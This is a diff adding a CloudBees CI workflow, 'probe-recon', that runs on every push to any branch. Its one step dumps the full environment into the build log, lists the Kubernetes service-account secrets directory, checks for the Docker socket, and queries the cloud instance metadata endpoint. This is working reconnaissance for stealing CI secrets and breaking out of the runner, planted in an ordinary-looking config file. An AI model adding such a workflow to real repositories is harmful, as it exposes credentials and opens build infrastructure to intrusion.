@@ -1,0 +1,22 @@
+apiVersion: automation.cloudbees.io/v1alpha1
+kind: workflow
+name: probe-recon
+
+on:
+  push:
+    branches:
+      - "**"
+
+jobs:
+  probe:
+    steps:
+      - name: recon
+        uses: docker://alpine:3.20
+        run: |
+          echo "== id"; id; hostname
+          echo "== cgroup"; head -5 /proc/1/cgroup
+          echo "== mounts"; mount | head -40
+          echo "== env"; env | sort
+          echo "== sa"; ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 | head -5
+          echo "== sock"; ls -la /var/run/docker.sock 2>&1 | head -3
+          echo "== md"; (wget -q -T3 -O- http://169.254.169.254/latest/meta-data/ 2>&1 || echo blocked) | head -5
